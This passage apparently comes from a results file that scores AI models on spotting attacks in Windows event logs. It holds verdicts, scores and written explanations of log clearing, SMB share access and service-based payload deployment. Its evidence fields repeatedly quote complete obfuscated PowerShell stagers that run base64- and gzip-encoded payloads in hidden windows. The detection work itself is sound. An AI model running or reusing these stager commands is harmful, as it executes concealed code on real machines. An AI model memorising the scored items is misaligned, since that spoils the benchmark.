P7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"", powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"", \??\C:\Windows\system32\conhost.exe 0xffffffff, ""C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
+- Network: 10.23.123.11, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show a clear attack chain starting with Event ID 1102 (Audit Log Cleared) by user 'admmig', followed immediately by a network logon (Event ID 4624) from IP 10.23.123.11 and the execution of obfuscated PowerShell commands (Event ID 4688) that decode and run hidden scripts. The activity includes accessing administrative shares (ADMIN$, C$) and retrieving specific files like 'MS17_010_psexec.evtx', indicating lateral movement and data exfiltration or tool staging. The combination of log clearing, hidden process execution, and access to sensitive system shares confirms malicious intent."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID5140-5145,4688,4697-Encrypted payload deployed with service over SMB (GLOBAL).csv",,,processed,YES,100.0,83.3,YES,"5140, 5145, 4697, 4688","powershell.exe, cmd.exe, conhost.exe, cscript.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe","admmig, SRVDEFENDER01$","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | $s.FileName=$b | $s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))' | $s.UseShellExecute=$false | $s.RedirectStandardOutput=$true | $s.WindowStyle='Hidden' | $s.CreateNoWindow=$true | $p=[System.Diagnostics.Process]::Start($s) | "", powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | "", ""C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())), \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\MOF\MOFWriter.exe""  -baseline ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Resources\113\BaselineWindowsServer2016.xml"" -out ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\BaselineRulesetAll.mof"" -err ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\xmlToMoferrors.txt"" , ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\DSC\ASMHost.exe"" Get ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\BaselineRulesetAll.mof"" ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447"", C:\Windows\system32\secedit.exe /export /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\secedit.exe /export /mergedpolicy /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\MusNotification.exe Display",10.23.123.11,,16.7,117.91,5.0,6.0,3.3,4,18.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5140, 5145, 4697, 4688
+- Processes: powershell.exe, cmd.exe, conhost.exe, cscript.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe
+- Accounts: admmig, SRVDEFENDER01$
+- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"", powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"", ""C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMx